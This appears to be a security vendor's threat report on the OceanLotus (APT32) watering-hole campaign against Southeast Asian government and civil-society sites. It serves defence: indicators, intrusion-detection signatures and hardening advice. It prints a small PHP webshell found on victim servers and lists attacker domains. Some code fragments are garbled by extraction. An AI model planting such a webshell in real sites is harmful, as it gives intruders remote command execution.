These attacks are being conducted through numerous strategically\ncompromised websites and have occurred over several high-profile ASEAN summits. Volexity has\ntied this attack campaign to an advanced persistent threat (APT) group first identified as\n[OceanLotus by SkyEye Labs in 2015. OceanLotus, also known as APT32, is believed to be a](http://blogs.360.cn/blog/oceanlotus-apt/)\nVietnam-based APT group that has become increasingly sophisticated in its attack tactics,\ntechniques, and procedures (TTPs). Volexity works closely with several human rights and civil\nsociety organizations. A few of these organizations have specifically been targeted by\nOceanLotus since early 2015. As a result, Volexity has been able to directly observe and\ninvestigate various attack campaigns. This report is based on a very targeted attack that Volexity\nobserved and the research that followed.\n\n\n-----\n\nfollows:\n\nMassive digital profiling and information collection campaign via strategically compromised\nwebsites\nOver 100 websites of individuals and organizations tied to Government, Military, Human\nRights, Civil Society, Media, State Oil Exploration, and more used to launch attacks around\nthe globe\nUse of whitelists to target only specific individuals and organizations\nCustom Google Apps designed for gaining access to victim Gmail accounts to steal e-mail\nand contacts\nStrategic and targeted JavaScript delivery to modify the view of compromised websites to\nfacilitate social engineering of visitors to install malware or provide access to e-mail\naccounts\nLarge distributed attack infrastructure spanning numerous hosting providers and countries\nNumerous attacker created domains designed to mimic legitimate online services and\norganizations such as AddThis, Disqus, Akamai, Baidu, Cloudflare, Facebook, Google, and\nothers\nHeavy uses of Let’s Encrypt SSL/TLS certificates\nUse of multiple backdoors, such as Cobalt Strike and others, believed to be developed and\nsolely used by OceanLotus\n\nVolexity believes the size and scale of this attack campaign have only previously been rivaled by\na Russian APT group commonly referred to as Turla and documented in a report from Symantec\n[called The Waterbug attack group. The OceanLotus threat group has successfully operated,](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf)\nlargely unnoticed, through several high-profile websites since late 2016. Volexity has observed\nthe following operating pattern for the OceanLotus group:\n\nCompromise website of strategic importance (e.g. websites visitors have a higher likelihood\nto be targets of interest)\nAdd one or more webshell backdoors to victim websites to maintain persistence\nWebshell used to add JavaScript developed by OceanLotus into the website\nThe malicious JavaScript makes calls over HTTP or HTTPS to attacker controlled domains\nto typically load one of two different OceanLotus frameworks\nOceanLotus JavaScript frameworks designed to track, profile, and target the compromised\nwebsite’s visitors\nWebsite visitors of interest are flagged for targeting and receive special JavaScript aimed at\ncompromising the user’s system or e-mail accounts\n\nVolexity has also noted that some of the organizations with compromised websites have also\nbeen targeted with spear phishing campaigns that attempt to install backdoors on the target\nsystems. Spear phishing activity and detailed malware infrastructure will be described in a follow\non report on OceanLotus activity.\n\n## Compromised Sites\n\n\n-----\n\nstrategically compromised by the OceanLotus attackers. The number of compromised websites\nexceeds 100. The overwhelming majority of the websites that have been compromised belong to\nVietnamese individuals and organizations that are critical of the Vietnamese Government. The\nremainder of the compromised websites are tied to one of three countries that share a land\nborder with Vietnam or the Philippines. Unlike with the Vietnamese victims, in most cases these\nwebsites are tied to state owned or affiliated organizations.\n\n### Vietnam\n\nVolexity has chosen not to list the Vietnamese websites that have been compromised, as the\nquantity is exceedingly large (over 80) and many of them are tied to individuals or very small\norganizations. However, the list below characterizes the types of websites that have been\nvictimized to facilitate this ongoing campaign.\n\nHuman Rights\nCivil Society\nNews/Media (English and Vietnamese Language)\nIndividual Bloggers\nReligion\n\n### ASEAN\n\n**Organization** **Website** **Compromised Page**\n\nAssociation of Southeast Asian asean.org /modules/aseanmail/js/wp-mailinglist.js\nNations (ASEAN) /modules/wordpress\npopup/inc/external/wpmu-lib/js/wpmuui.3.min.js\n\nASEAN Trade Repository atr.asean.org Main Index\n\nASEAN Investment investasean.asean.org Main Index\n\n### Cambodia\n\n**Organization** **Website** **Compromised Page**\n\nMinistry of Foreign Affairs www.mfa.gov.kh /jwplayer.js\n\nMinistry of Environment www.moe.gov.kh /other/js/jquery/jquery.js\n\nMinistry of Civil Service www.mcs.gov.kh Main Index\n\nNational Police www.police.gov.kh /wp-includes/js/jquery/jquery.js?ver=1.12.4\n\n\nMinistry of National AssemblySenate Relations and Inspection\n\nMinistry of Social Affairs, Veterans,\nand Youth Rehabilitation\n\n\nwww.monasri.gov.kh wtemplates/monasri_template/js/menu/mega.js\n\nwww.mosvy.gov.kh /public/js/default.js\n\n\n-----\n\n### Laos\n\n**Organization** **Website** **Compromised Page**\n\nBokeo Province bokeo.gov.la Main Index\n\nMinistry of Public Works and Transport www.mpwt.gov.la /media/system/js/mootools-core.js\n\n### Philippines\n\n**Organization** **Website** **Compromised Page**\n\nArmed Forces of the Philippines www.afp.mil.ph /modules/mod_js_flexslider/assets/js/jquery.easing.js\n\nOffice of the President op-proper.gov.ph Main Index\n\n## JavaScript Tracking, Profiling, and Delivery Frameworks\n\nThe compromised websites are being leveraged to deliver malicious JavaScript designed to\nprofile and fingerprint a user on each visit. Volexity found that OceanLotus had developed two\ndifferent JavaScript frameworks to accomplish their profiling and targeting activities. For the\npurposes of this blog, we will call them Framework A and Framework B. With few exceptions,\nthe compromised websites would only have code loading either Framework A or Framework B.\nEach of the hostnames and IPs were also tied to one of the two frameworks, with none of them\nserving up both. The following sections will provide some detail on the two frameworks and their\nmultiple scripting components.\n\n### Framework A\n\nFramework A is found on a limited number of victim sites. Initial URLs for access to Framework A\nare typically formatted similar to the following:\n\ncloudflare-api[.]com/ajax/libs/jquery/2.1.3/jquery.min.js?s=1&v=72580\n\nVolexity believes the v= value is unique and serves as a victim site identifier, which may not be\n\n\n-----\n\nloaded by the ASEAN website:\n\n**Framework A, Script 1 – Host Tracking**\nThe first script delivered contains several support functions such as an MD5 function, a base64\ndecoder, and functions for loading additional data. The goal of this script appears to be defining\neverything needed to track a host across different requests.\nThis script defines a section of variables used in other parts of the code. The host based ones are\nobtained from the User-Agent in the initial request.\n\nThen it will load a second JavaScript file:\n\nThe h1 and h2 values in the request are MD5 hashes of some information about the host making\nthe request. The first hash, h1, is the MD5 hash of various pieces of information collected from\nthe browser and concatenated together.\n\n\n-----\n\nThe second hash, h2, is also an MD5 hash, but the values concatenated are the screen height\nand width, timezone, plugins, MIME type, and language information.\n\nThe encrypt function simply iterates over the passed string and key string and adds the ASCII\nvalues at each position. Python scripts for encrypting and decrypting are as follows.\n\n_Encrypt:_\n\n\n#!/usr/bin/env python\n\n\nb64_data = base64.b64encode(sys.argv[2])\nkey = sys.argv[1]\nenc_data = \"\"\nfor i, x in enumerate(b64_data):\nk = key[i % len(key) -1]\nenc_data += chr(ord(x) + ord(k))\nprint\nprint base64 b64encode(enc data)\n\n\n-----\n\n#!/usr/bin/env python\n\n\nenc_data = base64.b64decode(b64_data)\n\n\n**Framework A, Script 2 – Profiling**\nThe second script returned starts by defining a browser_hash variable. This is composed of h1\nand the first 10 characters of h2, separated by “–“. This script then sends three GET requests,\neach with a d parameter in the query string that contains some encrypted and base64 encoded\ndata.\n\nOne request sends “Browser Plugins.” The info is collected in the following part of the code:\n\nAnother request sends “Extended Browser Info.” This info is collected as follows:\n\nThe final request sends “WebRTC” info to obtain the host IP address.\n\n\n-----\n\n### Framework B\n\nFramework B is found on the vast majority of sites. Initial URLs for access to Framework B are\nsimply references to JavaScript (.js) files on OceanLotus controlled sites. Volexity has found that\nthe URLs from Framework B do not actually matter, so long as the file extension ends in .js and a\nreferrer is sent with the request. The JavaScript will be sent back regardless of the file or folder\nrequested as long as it meets these two criteria.\n\nThe main ASEAN website is one of the few places that contain both Framework A and\nFramework B.\n\nThe following code has also been appended to legitimate JavaScript loaded by the ASEAN\nwebsite:\n\nThis script will result in the loading of JavaScript from the following URL:\n\nhttp://ad.jqueryclick[.]com/assets/adv.js\n\n**Framework B, Script 1 – Host Tracking**\nThe second framework collects similar information, but handles host tracking differently. The initial\nscript that is delivered varies based on the host OS as determined from the User-Agent in the\nrequest. When the script is loaded, it first makes a GET request to https://health-ray**id[.]com/robot.txt. This returns a UUID that is sent in subsequent requests as either zuuid or**\n**client_zuuid.It is also saved in localStorage for the compromised site under a key of x00Sync.**\nThe script then makes two GET requests.\n\nRequest 1:\n\nGET /api/<BASE64_ENCODED_DATA>/adFeedback.js\n\n\n-----\n\n{\"uuid\":\"62d096b35e82547b6a12607c2820f8e0\",\"zuuid\":\"ca3a8d02-a0f5-4686-9f6bcab4a17a9e2b\",\"hash\":\"\"}\n\nThe uuid value (also seen as client_uuid in later requests) is also generated by the script and is\nstored in a cookie named ___APISID for the compromised domain. It is generated using\n[the fingerprintjs2 library, which creates a hash based on browser information. This is another](https://github.com/Valve/fingerprintjs2)\nmethod for tracking users across requests. This library and several other legitimate JavaScript\nlibraries (including the jQuery core library and others for reading/storing cookies, collecting\ntimezone data, etc.) are typically downloaded from a CDN URL and saved into localStorage\nvariables to be later used by the script. They are stored as hex encoded data in a function called\n**x00Config.**\nIf the client is not on the OceanLotus whitelist, this request just returns a single line of JavaScript\nsetting a variable named timestamp. However, when the client is on the whitelist, Volexity has\nobserved a popup window that slowly fades in on top of the legitimate website. In a recent attack,\nthe popup appeared Google related and would redirect to a Google OAuth page designed to fool\nthe user into providing access to their account to a malicious Google App. More details on this\nappear further down in this post.\n\nRequest 2:\n\nGET /sync/<BASE64 _ENCODED_DATA/img_blank.gif\n\nThis request contains two pieces of information: a history section and a navigator section. The\n**history section contains information about the compromised site that the JavaScript was loaded**\nfrom. It also contains certain information about the host including the User-Agent, time and\ntimezone, and IP addresses.\n\nThe navigator section is blank the first time the request is made. When the script is first run, it\nrecords the current time in another localStorage variable. It only populates the navigator section\nif 24 hours have passed. It will also update the stored timestamp. This means the large section of\ndata in the navigator section is only sent once per day, even if this compromised site is visited\nmultiple times. This section includes a lot of the same information collected by Framework A,\nincluding MIME Types, plugins, and screen information. Below are a few portions of the data\ncollected and sent back to the OceanLotus servers.\n\n\n-----\n\n-----\n\n**Framework B, Script 2 – Popup for Whitelisted Systems**\nAs mentioned above, if a system is not on the whitelist, the GET\n**/api/<BASE64_ENCODED_DATA>/adFeedback.js request will just return a timestamp variable.**\nFor a whitelisted system, a new script is delivered. A portion of this script shown below makes a\nrequest to download some additional config data.\n\n\n-----\n\nThe domain for the request is loaded from the SAPIS_ID cookie which was set by the first script.\nBefore storing, it is split in two, the two substrings are reversed, then it is base64 encoded. An\nexample of the SAPIS_ID cookie can be seen in the navigator section above. This ultimately\ncalls the e.fn_getjson() function that makes a request like the following:\n\nGET /connect.js?\ntimestamp=59ba12f2eb1e240cd9431624&code=rtp&s1=64c6e32b951adc4f3d5661dba2330141\n\nThis returns a JSON config like the following:\n\nThese are saved and accessed via a getConfigs() function for different actions the script can\nperform.\n\n\n-----\n\nthe postShow() and postDown() functions, which send GET requests using the URLs shown\nabove. When one of the buttons is clicked, the user is redirected to login to the application.\n\n### Whitelisted Targeting for Google Account Access\n\nVolexity was able to work with organizations on the OceanLotus whitelist that received special\nresponses from Framework B. As a result, Volexity was able to directly observe two different\nOceanLotus attacks that attempted to fool the targeted user into providing access to their Google\nAccounts. OceanLotus attempts to compromise Google Accounts by prompting the user with a\npopup directing them to provide OAuth authorizations to a malicious Google App.\nOnce a user has been flagged for targeting, they will receive a popup when accessing an\nOceanLotus compromised website once every 24 hours. This popup slowly fades in over top of\nthe legitimate website and appears quite legitimate. Screen shots of two different observed\npopups are shown below.\n\nVersion 1: Locked Content\n\n\n-----\n\nVersion 2: Chrome Sign In\n\nRegardless of which option the user clicks, they are redirected to Google to initiate OAuth access\nto one of OceanLotus’ Google Apps. Below is a screen shot of what a user would see prior to\nauthorizing the the nefarious Google App.\n\n\n-----\n\nOceanLotus Google App OAuth\n\nIf the targeted user chooses ALLOW, the OceanLotus Google App immediately logs into the\naccount and starts accessing it. The account has permissions to access all e-mail and contacts,\nwhich is all the access OceanLotus needs to conduct digital surveillance. Volexity strongly\nrecommends that anyone that thinks they may have been targeted with this campaign or similar\nattacks review the Defense Against Ocean Lotus section below.\n\nOceanLotus is also known to be distributing malware in the form of fake Internet Explorer,\nChrome, and Firefox updates. Volexity has observed similar attacks via spear phishing against\ntargeted organizations that leverage some of the same malware infrastructure. In these cases,\nthe following Amazon S3 buckets were used to distribute the malware through JavaScript as part\n\n\n-----\n\ndownload-attachments.s3.amazonaws.com\n\nVolexity has observed multiple custom malware families and Cobalt Strike delivered through\nthese campaigns. Details on the observed malware samples are forthcoming.\n\n### Victim Websites Backdoored\n\nVolexity has worked with multiple victim organizations to assist with incident response efforts and\nto remedy their compromised systems. This process lead to the identification of different ways the\nOceanLotus group gains access to the compromised websites and how they maintain access.\n\n### Initial Compromise\n\nVolexity has observed OceanLotus compromising sites one of two ways:\n\n1. Direct user account access to the website’s content management system (CMS)\n2. Exploitation of outdated plugins and/or CMS components\n\nIt is currently unknown how the intruders gain working credentials to the victim websites. Based\non the TTPs leveraged by OceanLotus, it is possible that credentials could have been socially\nengineered (phished) from the victims or that the system administrators have been backdoored\nand a keylogger has assisted in capturing the login credentials. Alternatively, it is possible that\nsome of the credentials were simply guessed. Several of the Vietnamese websites are running\non Google’s Blogspot platform, so it is reasonable to believe that those users’ Google accounts\nmay be compromised. In the case of exploitation, the CMS software used by the victim\norganizations was often woefully out of date. Both the core components and added plugins had\nremotely exploitable vulnerabilities that lead to compromise.\n\n### Persistent Access\n\nIn all examined cases, OceanLotus attackers added PHP webshells to the victim websites. In\nmost cases, the intruders added a new file that was designed to blend in with the web directory in\nwhich it was placed. In some cases, Volexity observed OceanLotus adding PHP code to an\nexisting legitimate file already on the webserver.\n\nif(@$_POST['<variable-1>']&&@md5(md5($_POST['<variable-2>']))=='<md5 hash>')\n{\n$x=\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\";@eval($x($_POST['<variable1>']));exit();\n\nThe hex code storage in $x translates to base64_decode. This code checks to see if variable-1\nis set and then validates whether the MD5 of the MD5 of the value set for variable-2 matches an\nexpected MD5 hash. If these both evaluate as true, the contents of variable-1 are base64\ndecoded and evaluated on the system. This is a simple webshell that, similar to a China Chopper\nshell, allows direct execution on the system under the privileges of the account running the\nwebserver. The OceanLotus intruders use these shells to interact with the system and update\ntheir JavaScript code on the various websites\n\n\n-----\n\nwebshells are still present on the victim systems.\n\n## Campaign Infrastructure\n\nVolexity has identified a vast and sprawling amount of infrastructure leveraged by OceanLotus as\na part of this strategic web compromise campaign. There are even more indicators associated\nwith various malware campaigns that Volexity will detail in another OceanLotus post to follow.\nOceanLotus’s attack infrastructure has several unique characteristics, which makes it easy to\nidentify if a particular system is under their control. As a result, Volexity was able to identify\nnumerous systems that were not directly observed in active attacks but are strongly believed to\nbe tied to OceanLotus. In the sections below, the infrastructure has been separated into active\nand inactive/unknown categories. If the infrastructure is listed as active, this means that Volexity\nhas directly observed the hostname’s use in an attack. If the infrastructure is listed as\n**inactive/unknown, this means that Volexity found evidence the hostname was used in a past**\nattack but is no longer in use or it has never been observed in a direct attack but has unique\ncharacteristics indicative of OceanLotus infrastructure.\n\n### Active\n\n**Hostname** **IPv4 Address** **IPv6 Address**\n\na.doulbeclick.org 45.76.147.201 2001:19f0:4400:48ea:5400:ff:fe71:3201\n\nad.adthis.org 45.77.39.101 2001:19f0:4400:48fd:5400:ff:fe71:3202\n\nad.jqueryclick.com 64.62.174.146 N/A\n\napi.querycore.com 64.62.174.41 N/A\n\n\nbrowserextension.jdfkmiabjpfjacifcmihfdjhpnjpiick.com\n\n\n79.143.87.174 N/A\n\n\ncdn-js.com 128.199.227.80 N/A\n\ncdn.adsfly.co 45.32.100.179 2001:19f0:4400:4798:5400:ff:fe71:3200\n\ncdn.disqusapi.com 45.76.179.28 2001:19f0:4400:4989:5400:ff:fe71:3204\n\ncloudflare-api.com 45.32.105.45 NA\n\ncory.ns.webjzcnd.com 139.59.223.191 NA\n\ngooglescripts.com 45.114.117.164 NA\n\nhealth-ray-id.com 138.197.236.215 2604:a880:2:d0::378c:e001\n\nhit.asmung.net 45.32.114.49 NA\n\njquery.google-script.org 45.32.105.45 NA\n\njs.ecommer.org 45.76.179.151 2001:19f0:4400:48fd:5400:ff:fe71:3202\n\ns.jscore-group.com 64.62.174.17 NA\n\n\n-----\n\ns1.jqueryclick.com 64.62.174.145 NA\n\nssl.security.akamaihd-d.com 37.59.198.131 NA\n\nstat.cdnanalytic.com 203.114.75.22 NA\n\nstats.widgetapi.com 64.62.174.99 NA\n\ntrack-google.com 203.114.75.73 NA\n\nupdate.security.akamaihd-d.com 89.33.64.207 N/A\n\nupdate.webfontupdate.com 188.166.219.18 2400:6180:0:d0::4315:d001\n\nwiget.adsfly.co 45.32.100.179 2001:19f0:4400:4798:5400:ff:fe71:3200\n\nwww.googleuserscontent.org 139.59.217.207 2400:6180:0:d0::4315:7001\n\n### Inactive/Unknown Status\n\nVolexity was able to identify a substantial amount of infrastructure that belongs to OceanLotus\nthat is setup in a manner consistent with the above hostnames.

As a result, Volexity would recommend immediately\nputting in blocks or sinkholes for the domains and IP addresses listed above to prevent profiling\nand possible exploitation. The observed attacks thus far have relied on social engineering\ncampaigns; however, it would be trivial for OceanLotus to introduce an exploit into this chain. As\nfor malware indicators, Volexity will be providing additional data related to malware and backdoor\ninfrastructure in a future write-up to follow soon.\n\nWhen it comes to Google accounts, Volexity would recommend that users enable the 2-Step\nAuthentication. This is an effective way to prevent access to a Google account should the\npassword be compromised. However, in the case of this OceanLotus campaign, the attackers are\nleveraging a Google App that has OAuth authorized access to the victim’s e-mail and contacts.\nThis effectively bypasses 2-Step authentication as a result. Users should be very careful to only\nauthorize legitimate and known Google Apps. Users can verify what Google Apps have access to\ntheir account by visiting the following URL:\n\nhttps://myaccount.google.com/u/1/permissions\n\nThis will list the Google Apps with access to the account along with their permission levels. It is\npossible to defend against unauthorized applications and increase a Google Accounts security\n[through the Google Advanced Protection Program as well](https://landing.google.com/advancedprotection/)\n\nUsers can further verify what Google Apps and devices are accessing their account via the\nfollowing steps:\n\nLog into Gmail from a web browser via https://mail.google.com\nScroll to the bottom of the page and click Details to see a list of recent accesses to the\naccount\n\n\n-----\n\nhttps://support.google.com/mail/answer/7036019\n\nFinally, for website administrators, the key recommendations are as follows:\n\nUse strong passwords for CMS and system authentication\nRestrict access to the system and CMS functionality as much as possible (limited users,\nACLs, etc.)\nImplement two-factor (2FA) where possible\nKeep operating systems, CMS software, and CMS plugins up-to-date\nDisable or remove any accounts that are no longer needed or are unrecognized\n\n### Network Signatures\n\nIn addition to the domains and IP addresses, the following network signatures can be used to\ndetect various OceanLotus profiling and targeting activity.\n\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:”Volex – OceanLotus JavaScript Load\n(connect.js)”; flow:to_server,established; content:”GET”; http_method; content:”connect.js?\ntimestamp=”; http_uri; sid:2017083001; )\n\nalert http $EXTERNAL_NET any -> $HOME_NET any (msg:”Volex – OceanLotus JavaScript Fake\nPage URL Builder Response”; flow:to_client,established; file_data;content:”{|22|link|22|:|22|http”;\ndepth:13; file_data; content:”|22|load|22|”; sid:2017083002; rev:1;)\n\nalert http $EXTERNAL_NET any -> $HOME_NET any (msg:”Volex – OceanLotus System\nProfiling JavaScript (linkStorage.x00SOCKET)”; flow:to_client,established; file_data;\ncontent:”linkStorage.x00SOCKET”; sid:2017083003;)\n\n## Conclusion\n\nVolexity believes the OceanLotus threat group has rapidly advanced its capabilities and is now\none of the more sophisticated APT actors currently in operation. While Volexity does not typically\nengage in attempting attribution of any threat actor, Volexity does agree with previously reported\nassessments that OceanLotus is likely operating out of Vietnam. This is largely due to the\nextreme and wide-scale nature of certain targeting that would be extremely unlikely to align with\nthe interests of those outside of Vietnam. As a result, Volexity believes that OceanLotus has been\nrapidly developing a highly skilled and organized computer network exploitation (CNE) capability.\n\n\n-----",
